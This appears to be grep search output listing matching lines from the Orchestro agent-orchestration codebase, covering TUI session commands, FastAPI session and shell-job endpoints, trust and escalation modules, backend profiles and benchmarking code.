src/orchestro/tui.py:3050:                self._execute_button_command(command)
src/orchestro/tui.py:3056:                    self._execute_button_command(command)
src/orchestro/tui.py:3064:                sessions=self._sessions,
src/orchestro/tui.py:3065:                session_index=self.selected_session_index,
src/orchestro/tui.py:3082:                    self._execute_button_command(command)
src/orchestro/tui.py:3092:                    self._execute_button_command(command)
src/orchestro/tui.py:3095:        def _execute_button_command(self, command: str) -> None:
src/orchestro/tui.py:3119:            if command.startswith("select-session:"):
src/orchestro/tui.py:3120:                self.selected_session_index = int(command.split(":", 1)[1])
src/orchestro/tui.py:3161:            if command == "edit-session-title":
src/orchestro/tui.py:3164:            if command == "edit-session-summary":
src/orchestro/tui.py:3207:            if command == "focus-sessions":
src/orchestro/tui.py:3208:                self.action_switch_sessions()
src/orchestro/tui.py:3225:            self._execute_palette_command(command)
src/orchestro/tui.py:3230:            if self._editor_mode in {"session-summary", "plan-add-inline", "plan-edit-inline"}:
src/orchestro/tui.py:3265:            multiline = mode in {"session-summary", "plan-add-inline", "plan-edit-inline"}
src/orchestro/tui.py:3285:                if mode == "session-title":
src/orchestro/tui.py:3286:                    session_id = str(self._editor_context["session_id"])
src/orchestro/tui.py:3287:                    orchestro.db.update_session(session_id=session_id, title=value or None)
src/orchestro/tui.py:3288:                    self._record_action(f"updated session title for {session_id}")
src/orchestro/tui.py:3289:                elif mode == "session-summary":
src/orchestro/tui.py:3290:                    session_id = str(self._editor_context["session_id"])
src/orchestro/tui.py:3291:                    orchestro.db.update_session(session_id=session_id, summary=value or None)
src/orchestro/tui.py:3292:                    self._record_action(f"updated session summary for {session_id}")
src/orchestro/tui.py:3343:        def _selected_session(self) -> object | None:
src/orchestro/tui.py:3344:            if not self._sessions:
src/orchestro/tui.py:3346:            if self.selected_session_index >= len(self._sessions):
src/orchestro/tui.py:3347:                self.selected_session_index = max(0, len(self._sessions) - 1)
src/orchestro/tui.py:3348:            return self._sessions[self.selected_session_index]
src/orchestro/tui.py:3535:                for event in orchestro.db.list_shell_job_events(job_id)[-3:]:
src/orchestro/tui.py:3569:            self._sessions = orchestro.db.list_sessions(limit=12)
src/orchestro/tui.py:3572:            self._jobs = orchestro.db.list_shell_jobs(limit=12)
src/orchestro/tui.py:3576:            if self.selected_session_index >= len(self._sessions):
src/orchestro/tui.py:3577:                self.selected_session_index = max(0, len(self._sessions) - 1)
src/orchestro/tui.py:3588:            selected_session = self._selected_session()
src/orchestro/tui.py:3589:            selected_session_id = getattr(selected_session, "id", None) if selected_session is not None else None
src/orchestro/tui.py:3597:            if self.view_mode == "sessions":
src/orchestro/tui.py:3598:                selected_label = selected_session_id
src/orchestro/tui.py:3610:            session_runs = orchestro.db.list_session_runs(selected_session_id, limit=50) if selected_session_id else []
src/orchestro/tui.py:3613:            job_events = orchestro.db.list_shell_job_events(selected_job_id) if selected_job_id else []
src/orchestro/tui.py:3614:            job_inputs = orchestro.db.list_shell_job_inputs(job_id=selected_job_id, status="pending", limit=10) if selected_job_id else []
src/orchestro/tui.py:3639:            elif self.view_mode == "sessions" and selected_session is not None:
src/orchestro/tui.py:3640:                objective = getattr(selected_session, "summary", None) or getattr(selected_session, "title", None)
src/orchestro/tui.py:3811:                sessions=self._sessions,
src/orchestro/tui.py:3818:                session_index=self.selected_session_index,
src/orchestro/tui.py:3829:                sessions=self._sessions,
src/orchestro/tui.py:3909:                sessions=self._sessions,
src/orchestro/tui.py:3910:                session_index=self.selected_session_index,
src/orchestro/tui.py:3941:        def _execute_palette_command(self, raw: str) -> None:
src/orchestro/tui.py:3964:                self._execute_button_command("toggle-tray-max")
src/orchestro/tui.py:3972:                if target in {"runs", "sessions", "plans", "approvals", "jobs", "review", "integrations", "activity"}:
src/orchestro/tui.py:3979:            elif command == "session-title":
src/orchestro/tui.py:3980:                session = self._selected_session()
src/orchestro/tui.py:3981:                if session is None:
src/orchestro/tui.py:3982:                    self._last_error = "no session selected"
src/orchestro/tui.py:3984:                    self._last_error = "session-title requires text"
src/orchestro/tui.py:3986:                    orchestro.db.update_session(session_id=getattr(session, "id"), title=arg)
src/orchestro/tui.py:3988:                    self._record_action(f"updated session title for {getattr(session, 'id', '?')}")
src/orchestro/tui.py:3989:            elif command == "session-summary":
src/orchestro/tui.py:3990:                session = self._selected_session()
src/orchestro/tui.py:3991:                if session is None:
src/orchestro/tui.py:3992:                    self._last_error = "no session selected"
src/orchestro/tui.py:3994:                    self._last_error = "session-summary requires text"
src/orchestro/tui.py:3996:                    orchestro.db.update_session(session_id=getattr(session, "id"), summary=arg)
src/orchestro/tui.py:3998:                    self._record_action(f"updated session summary for {getattr(session, 'id', '?')}")
src/orchestro/tui.py:4053:                    orchestro.db.request_shell_job_pause(job_id=getattr(job, "id"), reason="paused-from-tui")
src/orchestro/tui.py:4061:                    orchestro.db.request_shell_job_resume(job_id=getattr(job, "id"), reason="resumed-from-tui")
src/orchestro/tui.py:4069:                    orchestro.db.request_shell_job_cancel(job_id=getattr(job, "id"), reason="canceled-from-tui")
src/orchestro/tui.py:4072:            elif command == "archive-session":
src/orchestro/tui.py:4073:                session = self._selected_session()
src/orchestro/tui.py:4074:                if session is None:
src/orchestro/tui.py:4075:                    self._last_error = "no session selected"
src/orchestro/tui.py:4077:                    orchestro.db.update_session(session_id=getattr(session, "id"), status="archived")
src/orchestro/tui.py:4079:                    self._record_action(f"archived session {getattr(session, 'id', '?')}")
src/orchestro/tui.py:4080:            elif command == "activate-session":
src/orchestro/tui.py:4081:                session = self._selected_session()
src/orchestro/tui.py:4082:                if session is None:
src/orchestro/tui.py:4083:                    self._last_error = "no session selected"
src/orchestro/tui.py:4085:                    orchestro.db.update_session(session_id=getattr(session, "id"), status="active")
src/orchestro/tui.py:4087:                    self._record_action(f"activated session {getattr(session, 'id', '?')}")
src/orchestro/tui.py:4168:            session_map: dict[str, int] = {}
src/orchestro/tui.py:4177:            for index, session in enumerate(self._sessions):
src/orchestro/tui.py:4178:                key = f"session:{getattr(session, 'id', '')}"
src/orchestro/tui.py:4179:                label = getattr(session, "title", None) or ""
src/orchestro/tui.py:4181:                session_map[key] = index
src/orchestro/tui.py:4205:                if key in session_map:
src/orchestro/tui.py:4206:                    self.view_mode = "sessions"
src/orchestro/tui.py:4207:                    self.selected_session_index = session_map[key]
src/orchestro/tui.py:4308:                sessions=self._sessions,
src/orchestro/tui.py:4309:                session_index=self.selected_session_index,
src/orchestro/tui.py:4417:            self._execute_button_command(command)
src/orchestro/tui.py:4447:                    orchestro.execute_prepared_run(prepared, on_chunk=on_chunk)
src/orchestro/tui.py:4449:                    orchestro.execute_prepared_run(prepared)
docs/api-reference.md:3:Orchestro exposes a FastAPI service for status, runs, tools, plans, sessions, knowledge records, scheduled tasks, and benchmark metadata.
docs/api-reference.md:15:3. [Sessions And Plans](#sessions-and-plans)
docs/api-reference.md:70:`POST /ask/stream` returns server-sent events with token chunks and a final done event.
docs/api-reference.md:76:- `GET /sessions`
docs/api-reference.md:77:- `GET /sessions/{session_id}`
docs/api-reference.md:78:- `POST /sessions`
docs/api-reference.md:79:- `POST /sessions/{session_id}/compact`
docs/api-reference.md:111:These records feed retrieval and training export paths. See [Architecture](architecture.md) and [Testing And Operations](testing-and-operations.md#data-and-export-paths).
docs/api-reference.md:124:- `GET /shell-jobs`
docs/api-reference.md:125:- `GET /shell-jobs/{job_id}`
docs/api-reference.md:126:- `POST /shell-jobs/{job_id}/inject`
docs/api-reference.md:140:curl http://127.0.0.1:8765/backends
docs/api-reference.md:146:curl -X POST http://127.0.0.1:8765/ask \
docs/api-reference.md:154:curl -X POST http://127.0.0.1:8765/sessions \
docs/api-reference.md:162:curl -X POST http://127.0.0.1:8765/tools/run \
tests/test_agent_cli_backend.py:76:    def test_true_when_binary_on_path(self):
tests/test_agent_cli_backend.py:86:    def test_resolved_binary_returns_full_path(self):
tests/test_agent_cli_backend.py:98:# run() — success and error paths
tests/test_agent_cli_backend.py:283:    def test_exec_subcommand_present(self):
tests/test_agent_cli_backend.py:285:        assert argv[0] == "exec"
src/orchestro/trust.py:5:from pathlib import Path
src/orchestro/trust.py:7:from orchestro.paths import data_dir
src/orchestro/trust.py:20:    session_overrides: dict[str, str] = field(default_factory=dict)
src/orchestro/trust.py:23:def _trust_json_path(dir_path: Path | None = None) -> Path:
src/orchestro/trust.py:24:    base = dir_path if dir_path is not None else data_dir()
src/orchestro/trust.py:28:def load_trust_policy(dir_path: Path | None = None) -> TrustPolicy:
src/orchestro/trust.py:29:    path = _trust_json_path(dir_path)
src/orchestro/trust.py:30:    if not path.exists():
src/orchestro/trust.py:32:    raw = json.loads(path.read_text(encoding="utf-8"))
src/orchestro/trust.py:36:        session_overrides=raw.get("session_overrides", {}),
src/orchestro/trust.py:40:def save_trust_policy(policy: TrustPolicy, dir_path: Path | None = None) -> None:
src/orchestro/trust.py:41:    path = _trust_json_path(dir_path)
src/orchestro/trust.py:42:    path.parent.mkdir(parents=True, exist_ok=True)
src/orchestro/trust.py:47:    if policy.session_overrides:
src/orchestro/trust.py:48:        payload["session_overrides"] = policy.session_overrides
src/orchestro/trust.py:49:    path.write_text(json.dumps(payload, indent=2, sort_keys=True), encoding="utf-8")
src/orchestro/trust.py:78:    if tool_name in policy.session_overrides:
src/orchestro/trust.py:79:        override = policy.session_overrides[tool_name]
src/orchestro/bash_analysis.py:43:    (re.compile(r"\beval\b"), "eval (dynamic code execution)"),
src/orchestro/escalation.py:12:from pathlib import Path
src/orchestro/escalation.py:15:from orchestro.paths import data_dir
src/orchestro/escalation.py:41:    def __init__(self, path: Path | None = None) -> None:
src/orchestro/escalation.py:42:        self.path = path or data_dir() / "escalations.log"
src/orchestro/escalation.py:46:            self.path.parent.mkdir(parents=True, exist_ok=True)
src/orchestro/escalation.py:47:            with open(self.path, "a") as fh:
src/orchestro/escalation.py:92:                shell=True,
src/orchestro/escalation.py:104:    "shell": ShellChannel,
src/orchestro/escalation.py:112:    channel_type = spec.get("type", "shell")
src/orchestro/escalation.py:113:    if channel_type == "shell":
src/orchestro/escalation.py:116:        path = Path(spec["path"]) if "path" in spec else None
src/orchestro/escalation.py:117:        return FileChannel(path=path)
src/orchestro/escalation.py:136:    config_path = dd / "escalation.json"
src/orchestro/escalation.py:138:    if not config_path.exists():
src/orchestro/escalation.py:141:        raw = json.loads(config_path.read_text())
src/orchestro/escalation.py:143:        logger.exception("failed to load escalation config from %s", config_path)
src/orchestro/escalation.py:149:    default_name = raw.get("default", "shell")
src/orchestro/escalation.py:152:    elif default_name == "shell":
src/orchestro/escalation.py:193:    log_path = dd / "escalations.log"
src/orchestro/escalation.py:194:    if not log_path.exists():
src/orchestro/escalation.py:198:        lines = log_path.read_text().splitlines()
docs/instructions-and-constitutions.md:72:- `ORCHESTRO.md` for repo-local execution and coding rules
docs/instructions-and-constitutions.md:108:- [Shell Mode](shell.md)
src/orchestro/git_changes.py:4:from pathlib import Path
src/orchestro/job_states.py:54:    job = db.get_shell_job(job_id)
src/orchestro/job_states.py:56:        raise ValueError(f"shell job not found: {job_id}")
src/orchestro/job_states.py:59:    db.update_shell_job_status(job_id=job_id, status=to_state)
src/orchestro/job_states.py:60:    db.append_shell_job_event(
src/orchestro/approvals.py:6:from pathlib import Path
src/orchestro/approvals.py:16:    path: Path
src/orchestro/approvals.py:19:        if not self.path.exists():
src/orchestro/approvals.py:21:        payload = json.loads(self.path.read_text(encoding="utf-8"))
src/orchestro/approvals.py:33:        self.path.parent.mkdir(parents=True, exist_ok=True)
src/orchestro/approvals.py:34:        self.path.write_text(json.dumps({"allow": patterns}, indent=2, sort_keys=True), encoding="utf-8")
src/orchestro/compaction.py:117:        for path in _FILE_PATH_RE.findall(entry):
src/orchestro/compaction.py:118:            if "/" in path and len(path) > 3:
src/orchestro/compaction.py:119:                facts.append(f"File referenced: {path}")
src/orchestro/backend_profiles.py:111:            base_url="http://127.0.0.1:8000/v1",
src/orchestro/backend_profiles.py:115:            base_url="http://127.0.0.1:8001/v1",
src/orchestro/backend_profiles.py:119:            base_url="http://127.0.0.1:8002/v1",
src/orchestro/backend_profiles.py:123:            base_url="http://127.0.0.1:11434/v1",
src/orchestro/backend_profiles.py:135:            base_url="https://api.openai.com/v1",
src/orchestro/backend_profiles.py:139:            base_url="https://api.openai.com/v1",
src/orchestro/backend_profiles.py:146:            base_url="https://openrouter.ai/api/v1",
src/orchestro/backend_profiles.py:156:        if any(token in lowered for token in ("coder", "code")):
src/orchestro/backend_profiles.py:158:        if any(token in lowered for token in ("haiku", "mini", "4b", "3b", "fast")):
src/orchestro/backend_profiles.py:160:        if any(token in lowered for token in ("sonnet", "opus", "gpt-5", "8b", "balanced")):
src/orchestro/backend_profiles.py:203:    preferred_tokens: tuple[str, ...]
src/orchestro/backend_profiles.py:205:        preferred_tokens = ("coder", "code")
src/orchestro/backend_profiles.py:207:        preferred_tokens = ("opus", "sonnet", "gpt-5", "8b", "balanced")
src/orchestro/backend_profiles.py:209:        preferred_tokens = ("haiku", "mini", "4b", "fast")
src/orchestro/backend_profiles.py:211:        preferred_tokens = ()
src/orchestro/backend_profiles.py:214:        if preferred_tokens and any(token in lowered for token in preferred_tokens):
src/orchestro/backend_profiles.py:467:    "https://api.openai.com": "OPENAI_API_KEY",
src/orchestro/backend_profiles.py:468:    "https://openrouter.ai": "OPENROUTER_API_KEY",
src/orchestro/tasks.py:5:from pathlib import Path
src/orchestro/tasks.py:45:                shell=True,
src/orchestro/lsp_client.py:8:from pathlib import Path
src/orchestro/lsp_client.py:10:from orchestro.paths import data_dir
src/orchestro/lsp_client.py:26:def file_uri(path: str) -> str:
src/orchestro/lsp_client.py:27:    absolute = str(Path(path).resolve())
src/orchestro/lsp_client.py:31:def language_for_file(path: str) -> str | None:
src/orchestro/lsp_client.py:32:    return EXTENSION_LANGUAGE_MAP.get(Path(path).suffix.lower())
src/orchestro/lsp_client.py:256:    def load_config(self, data_dir_path: Path | None = None) -> list[LSPServerConfig]:
src/orchestro/lsp_client.py:257:        config_path = (data_dir_path or data_dir()) / "lsp_servers.json"
src/orchestro/lsp_client.py:258:        if not config_path.exists():
src/orchestro/lsp_client.py:260:        with open(config_path) as f:
src/orchestro/commands.py:128:    _sessions = [
src/orchestro/commands.py:129:        CommandMeta("session", category="sessions", help="Manage sessions (new, resume, list, fork, compact)"),
src/orchestro/commands.py:172:        CommandMeta("trust_set", category="config", help="Set a session trust override for a tool"),
src/orchestro/commands.py:175:    _shell = [
src/orchestro/commands.py:176:        CommandMeta("quit", aliases=("exit",), category="shell", help="Exit the shell"),
src/orchestro/commands.py:177:        CommandMeta("help", category="shell", help="Show this help"),
src/orchestro/commands.py:181:        CommandMeta("cost", category="inspection", help="Show session or shell token totals"),
src/orchestro/commands.py:186:        _backends, _sessions, _approvals, _benchmarks, _training,
src/orchestro/commands.py:187:        _scheduling, _navigation, _config, _inspection, _shell,
src/orchestro/bench.py:10:from pathlib import Path
src/orchestro/bench.py:16:from orchestro.paths import project_root
src/orchestro/bench.py:39:    avg_tokens: float = 0.0
src/orchestro/bench.py:40:    total_tokens: int = 0
src/orchestro/bench.py:87:def default_benchmark_suite_path() -> Path:
src/orchestro/bench.py:91:def load_benchmark_cases(path: Path) -> tuple[str, list[BenchmarkCase]]:
src/orchestro/bench.py:92:    payload = json.loads(path.read_text(encoding="utf-8"))
src/orchestro/bench.py:93:    suite_name = str(payload.get("suite", path.stem))
src/orchestro/bench.py:123:    suite_path: Path,
src/orchestro/bench.py:129:    suite_name, cases = load_benchmark_cases(suite_path)
src/orchestro/bench.py:158:                app.execute_prepared_run(
src/orchestro/bench.py:186:        "suite_path": str(suite_path),
src/orchestro/bench.py:298:        ("avg_tokens", "avg tokens", True),
src/orchestro/bench.py:302:        ("total_tokens", "total tokens", True),
src/orchestro/bench.py:383:        elif etype in {"step_completed", "plan_execute_step_completed"}:
src/orchestro/bench.py:416:        "prompt_tokens": run.prompt_tokens if run else 0,
src/orchestro/bench.py:417:        "completion_tokens": run.completion_tokens if run else 0,
src/orchestro/bench.py:418:        "total_tokens": run.total_tokens if run else 0,
src/orchestro/bench.py:447:        metrics.total_tokens += rm["total_tokens"]
src/orchestro/bench.py:460:    metrics.avg_tokens = round(metrics.total_tokens / n, 1)
src/orchestro/bench.py:481:        f"  avg tokens  : {metrics.avg_tokens:.0f} (total {metrics.total_tokens})",
src/orchestro/bench.py:504:        "avg_tokens": metrics.avg_tokens,
src/orchestro/bench.py:505:        "total_tokens": metrics.total_tokens,
src/orchestro/bench.py:526:        avg_tokens=float(d.get("avg_tokens", 0.0)),
src/orchestro/bench.py:527:        total_tokens=int(d.get("total_tokens", 0)),
src/orchestro/bench.py:611:    suite_path: Path,
src/orchestro/bench.py:622:                suite_path=suite_path,
src/orchestro/bench.py:645:        "suite_name": summaries[0]["suite_name"] if summaries else suite_path.stem,
src/orchestro/policies.py:6:from pathlib import Path
src/orchestro/policies.py:8:from orchestro.paths import data_dir
src/orchestro/policies.py:61:def _policies_json_path(dir_path: Path | None = None) -> Path:
src/orchestro/policies.py:62:    base = dir_path if dir_path is not None else data_dir()
src/orchestro/policies.py:66:def load_policies(dir_path: Path | None = None) -> list[Policy]:
src/orchestro/policies.py:67:    path = _policies_json_path(dir_path)
src/orchestro/policies.py:68:    if not path.exists():
src/orchestro/policies.py:70:    raw = json.loads(path.read_text(encoding="utf-8"))
src/orchestro/collections.py:5:from pathlib import Path
src/orchestro/collections.py:90:    file_path: Path,
src/orchestro/collections.py:94:    text = file_path.read_text(encoding="utf-8")
src/orchestro/collections.py:96:        strategy = MarkdownChunker() if file_path.suffix == ".md" else ParagraphChunker()
src/orchestro/collections.py:102:        source_ref=file_path.name,
src/orchestro/collections.py:109:    dir_path: Path,
src/orchestro/collections.py:115:    for path in sorted(dir_path.rglob("*")):
src/orchestro/collections.py:116:        if path.is_file() and path.suffix in allowed:
src/orchestro/collections.py:117:            total += ingest_file(db, collection_id, path)
src/orchestro/plugins.py:4:from pathlib import Path
src/orchestro/plugins.py:76:        for path in sorted(self.plugins_dir.iterdir()):
src/orchestro/plugins.py:77:            if path.suffix == ".py" and not path.name.startswith("_"):
src/orchestro/plugins.py:78:                self._load_plugin(path)
src/orchestro/plugins.py:80:    def _load_plugin(self, path: Path) -> None:
src/orchestro/plugins.py:83:        spec = importlib.util.spec_from_file_location(f"orchestro_plugin_{path.stem}", path)
src/orchestro/plugins.py:88:            spec.loader.exec_module(module)
src/orchestro/plugins.py:90:            self.load_errors.append({"plugin": path.stem, "error": str(exc)})
src/orchestro/plugins.py:99:            self.loaded.append(PluginMetadata(name=path.stem))
src/orchestro/planner.py:5:from pathlib import Path
src/orchestro/planner.py:34:                        "Create a concise execution plan for the following goal.\n"
src/orchestro/planner.py:47:                        "You are generating an execution plan, not doing the work. "
src/orchestro/training_export.py:6:from pathlib import Path
src/orchestro/training_export.py:96:def export_jsonl(examples: list[PreferenceExample], output_path: Path) -> int:
src/orchestro/training_export.py:97:    output_path.parent.mkdir(parents=True, exist_ok=True)
src/orchestro/training_export.py:99:    with output_path.open("w", encoding="utf-8") as fh:
src/orchestro/training_export.py:112:def export_dpo(examples: list[PreferenceExample], output_path: Path) -> int:
src/orchestro/training_export.py:113:    output_path.parent.mkdir(parents=True, exist_ok=True)
src/orchestro/training_export.py:115:    with output_path.open("w", encoding="utf-8") as fh:
src/orchestro/training_export.py:129:def export_sft(examples: list[PreferenceExample], output_path: Path) -> int:
src/orchestro/training_export.py:130:    output_path.parent.mkdir(parents=True, exist_ok=True)
src/orchestro/training_export.py:132:    with output_path.open("w", encoding="utf-8") as fh:
src/orchestro/mcp_server.py:8:from orchestro.paths import db_path
src/orchestro/mcp_server.py:250:    db = OrchestroDB(db_path())
src/orchestro/instructions.py:4:from pathlib import Path
src/orchestro/instructions.py:6:from orchestro.paths import global_instructions_path
src/orchestro/instructions.py:12:    path: Path
src/orchestro/instructions.py:27:            parts.append(f"[{source.label}: {source.path}]\n{stripped}")
src/orchestro/instructions.py:37:                    "path": str(source.path),
src/orchestro/instructions.py:48:    global_path = global_instructions_path()
src/orchestro/instructions.py:49:    if global_path.exists():
src/orchestro/instructions.py:53:                path=global_path,
src/orchestro/instructions.py:54:                content=global_path.read_text(encoding="utf-8"),
src/orchestro/instructions.py:58:    project_path = find_project_instructions(working_directory)
src/orchestro/instructions.py:59:    if project_path is not None:
src/orchestro/instructions.py:63:                path=project_path,
src/orchestro/instructions.py:64:                content=project_path.read_text(encoding="utf-8"),
src/orchestro/verifiers.py:213:def _parse_amount_token(raw: str) -> Decimal | None:
src/orchestro/verifiers.py:241:        p = _parse_amount_token(m.group(0))
src/orchestro/verifiers.py:306:            p = _parse_amount_token(m.group(0))
src/orchestro/facts_file.py:3:from pathlib import Path
src/orchestro/facts_file.py:36:def sync_facts_file(path: Path, records: list[FactRecord]) -> None:
src/orchestro/facts_file.py:37:    path.write_text(render_facts(records), encoding="utf-8")
src/orchestro/mcp_client.py:8:from pathlib import Path
src/orchestro/mcp_client.py:11:from orchestro.paths import data_dir
src/orchestro/mcp_client.py:146:        config_path = (config_dir or data_dir()) / "mcp_servers.json"
src/orchestro/mcp_client.py:147:        if not config_path.exists():
src/orchestro/mcp_client.py:149:        with open(config_path) as f:
src/orchestro/embeddings.py:57:        api_key: str | None = None,
src/orchestro/embeddings.py:61:        self.api_key = api_key or os.environ.get("ORCHESTRO_EMBED_API_KEY", "dummy")
src/orchestro/embeddings.py:75:                "Authorization": f"Bearer {self.api_key}",
src/orchestro/scheduler.py:8:from pathlib import Path
src/orchestro/scheduler.py:112:                    self._execute_task(task)
src/orchestro/scheduler.py:114:                logger.exception("scheduler: failed to execute task %s", task.task_id)
src/orchestro/scheduler.py:120:    def _execute_task(self, task: ScheduledTask) -> None:
src/orchestro/routing.py:75:    avg_tokens: float = 0.0
src/orchestro/routing.py:89:            rows = conn.execute(
src/orchestro/routing.py:96:                    AVG(r.total_tokens) AS avg_tok
src/orchestro/routing.py:104:            rows = conn.execute(
src/orchestro/routing.py:111:                    AVG(r.total_tokens) AS avg_tok
src/orchestro/routing.py:117:        rating_rows = conn.execute(
src/orchestro/routing.py:148:            avg_tokens=avg_tok,
src/orchestro/routing.py:175:            if task_type == "code" and any(token in model for model in models for token in ("coder", "code")):
src/orchestro/routing.py:177:            elif task_type == "analysis" and any(token in model for model in models for token in ("sonnet", "opus", "gpt-5", "8b")):
src/orchestro/routing.py:179:            elif task_type in {"search", "creative"} and any(token in model for model in models for token in ("haiku", "mini", "4b", "fast")):
src/orchestro/routing.py:190:        s.avg_tokens,
src/orchestro/routing.py:212:            f"{s.success_rate:>6.1%} {s.avg_tokens:>9.0f} {s.positive_ratings:>4} {s.negative_ratings:>4}"
docs/cli-reference.md:16:3. [Sessions And Plans](#sessions-and-plans)
docs/cli-reference.md:28:- `shell`: launch the interactive shell
docs/cli-reference.md:38:- `--cwd <path>`
docs/cli-reference.md:69:- `sessions`
docs/cli-reference.md:70:- `session-new`
docs/cli-reference.md:71:- `session-show`
docs/cli-reference.md:72:- `session-resume`
docs/cli-reference.md:73:- `session-fork`
docs/cli-reference.md:74:- `session-compact`
docs/cli-reference.md:87:These commands operate on persisted, SQLite-backed session and plan records. For API equivalents, see [API Reference](api-reference.md). For examples, see [Examples](examples.md).
docs/cli-reference.md:107:For MCP and LSP config paths, see [Examples](examples.md#example-mcp-and-lsp-config), [MCP](mcp.md), and [LSP](lsp.md).
docs/cli-reference.md:164:- `shell-jobs`
docs/cli-reference.md:165:- `shell-job-show`
docs/cli-reference.md:166:- `shell-job-inject`
docs/cli-reference.md:178:- The interactive shell has its own higher-level operator flow. See [Shell Mode](shell.md).
src/orchestro/api.py:5:from pathlib import Path
src/orchestro/api.py:14:from orchestro.bench import compare_benchmark_summaries, default_benchmark_suite_path, run_benchmark_matrix, run_benchmark_suite
src/orchestro/api.py:64:    suite: str = str(default_benchmark_suite_path())
src/orchestro/api.py:72:    suite: str = str(default_benchmark_suite_path())
src/orchestro/api.py:290:    session_id: str | None = None,
src/orchestro/api.py:292:    runs = orchestro.db.list_runs(limit=limit, query=query, backend_name=backend_name, status=status, session_id=session_id)
src/orchestro/api.py:296:            "session_id": run.session_id,
src/orchestro/api.py:311:            "prompt_tokens": run.prompt_tokens,
src/orchestro/api.py:312:            "completion_tokens": run.completion_tokens,
src/orchestro/api.py:313:            "total_tokens": run.total_tokens,
src/orchestro/api.py:344:@app.get("/sessions")
src/orchestro/api.py:345:def list_sessions(limit: int = 20, status: str | None = None) -> list[dict[str, object]]:
src/orchestro/api.py:346:    sessions = orchestro.db.list_sessions(limit=limit, status=status)
src/orchestro/api.py:349:            "id": session.id,
src/orchestro/api.py:350:            "parent_session_id": session.parent_session_id,
src/orchestro/api.py:351:            "fork_point_run_id": session.fork_point_run_id,
src/orchestro/api.py:352:            "title": session.title,
src/orchestro/api.py:353:            "status": session.status,
src/orchestro/api.py:354:            "summary": session.summary,
src/orchestro/api.py:355:            "context_snapshot": session.context_snapshot,
src/orchestro/api.py:356:            "created_at": session.created_at,
src/orchestro/api.py:357:            "updated_at": session.updated_at,
src/orchestro/api.py:359:        for session in sessions
src/orchestro/api.py:363:@app.get("/sessions/{session_id}")
src/orchestro/api.py:364:def get_session(session_id: str) -> dict[str, object]:
src/orchestro/api.py:365:    session = orchestro.db.get_session(session_id)
src/orchestro/api.py:366:    if session is None:
src/orchestro/api.py:367:        raise HTTPException(status_code=404, detail="session not found")
src/orchestro/api.py:368:    runs = orchestro.db.list_session_runs(session_id, limit=50)
src/orchestro/api.py:370:        "session": {
src/orchestro/api.py:371:            "id": session.id,
src/orchestro/api.py:372:            "parent_session_id": session.parent_session_id,
src/orchestro/api.py:373:            "fork_point_run_id": session.fork_point_run_id,
src/orchestro/api.py:374:            "title": session.title,
src/orchestro/api.py:375:            "status": session.status,
src/orchestro/api.py:376:            "summary": session.summary,
src/orchestro/api.py:377:            "context_snapshot": session.context_snapshot,
src/orchestro/api.py:378:            "created_at": session.created_at,
src/orchestro/api.py:379:            "updated_at": session.updated_at,
src/orchestro/api.py:397:@app.post("/sessions")
src/orchestro/api.py:398:def create_session(payload: SessionPayload) -> dict[str, object]:
src/orchestro/api.py:399:    session_id = str(uuid4())
src/orchestro/api.py:400:    orchestro.db.create_session(session_id=session_id, title=payload.title)
src/orchestro/api.py:401:    return get_session(session_id)
src/orchestro/api.py:404:@app.post("/sessions/{session_id}/compact")
src/orchestro/api.py:405:def compact_session(session_id: str, limit: int = 50) -> dict[str, object]:
src/orchestro/api.py:406:    session = orchestro.db.get_session(session_id)
src/orchestro/api.py:407:    if session is None:
src/orchestro/api.py:408:        raise HTTPException(status_code=404, detail="session not found")
src/orchestro/api.py:409:    runs = orchestro.db.list_session_runs(session_id, limit=limit)
src/orchestro/api.py:422:    summary = f"Compacted {len(runs[-limit:])} run(s)" if runs else "Compacted empty session"
src/orchestro/api.py:423:    orchestro.db.update_session(session_id=session_id, summary=summary, context_snapshot=snapshot)
src/orchestro/api.py:424:    return get_session(session_id)
src/orchestro/api.py:543:@app.get("/shell-jobs")
src/orchestro/api.py:544:def list_shell_jobs(limit: int = 20) -> list[dict[str, object]]:
src/orchestro/api.py:545:    jobs = orchestro.db.list_shell_jobs(limit=limit)
src/orchestro/api.py:623:@app.get("/shell-jobs/{job_id}")
src/orchestro/api.py:624:def get_shell_job(job_id: str) -> dict[str, object]:
src/orchestro/api.py:625:    job = orchestro.db.get_shell_job(job_id)
src/orchestro/api.py:627:        raise HTTPException(status_code=404, detail="shell job not found")
src/orchestro/api.py:654:            for event in orchestro.db.list_shell_job_events(job_id)
src/orchestro/api.py:666:            for item in orchestro.db.list_shell_job_inputs(job_id=job_id, limit=50)
src/orchestro/api.py:671:@app.post("/shell-jobs/{job_id}/inject")
src/orchestro/api.py:672:def inject_shell_job_input(job_id: str, payload: ShellJobInjectPayload) -> dict[str, object]:
src/orchestro/api.py:673:    job = orchestro.db.get_shell_job(job_id)
src/orchestro/api.py:675:        raise HTTPException(status_code=404, detail="shell job not found")
src/orchestro/api.py:677:    orchestro.db.enqueue_shell_job_input(
src/orchestro/api.py:683:    orchestro.db.append_shell_job_event(
src/orchestro/api.py:719:        orchestro.db.request_shell_job_resume(job_id=job.id, reason="operator input injected")
src/orchestro/api.py:754:        from orchestro.paths import tool_approvals_path
src/orchestro/api.py:755:        ToolApprovalStore(tool_approvals_path()).remember(approved_pattern)
src/orchestro/api.py:763:        orchestro.db.request_shell_job_resume(job_id=record.job_id, reason=f"approval {payload.decision}")
src/orchestro/api.py:783:            "session_id": run.session_id,
src/orchestro/api.py:799:            "prompt_tokens": run.prompt_tokens,
src/orchestro/api.py:800:            "completion_tokens": run.completion_tokens,
src/orchestro/api.py:801:            "total_tokens": run.total_tokens,
src/orchestro/api.py:895:        suite_path=Path(payload.suite),
src/orchestro/api.py:908:        suite_path=Path(payload.suite),
src/orchestro/api.py:1153:            "avg_tokens": s.avg_tokens,
src/orchestro/api.py:1244:    output_path = Path(payload.output)
src/orchestro/api.py:1245:    written = exporter(examples, output_path)
src/orchestro/api.py:1249:        "output": str(output_path),
src/orchestro/api.py:1302:        orchestro.execute_prepared_run(prepared)
src/orchestro/api.py:1322:    """Server-Sent Events endpoint — streams output tokens as they arrive.
src/orchestro/api.py:1324:    Each event is a JSON object: ``{"token": "..."}`` or
src/orchestro/api.py:1338:        def on_chunk(token: str) -> None:
src/orchestro/api.py:1339:            chunks.append(token)
src/orchestro/api.py:1343:            orchestro.execute_prepared_run(
src/orchestro/api.py:1352:        # comes back all at once; emit it as a single token event).
src/orchestro/api.py:1354:            for token in chunks:
src/orchestro/api.py:1355:                yield f"data: {_json.dumps({'token': token})}\n\n"
src/orchestro/api.py:1360:                yield f"data: {_json.dumps({'token': output})}\n\n"
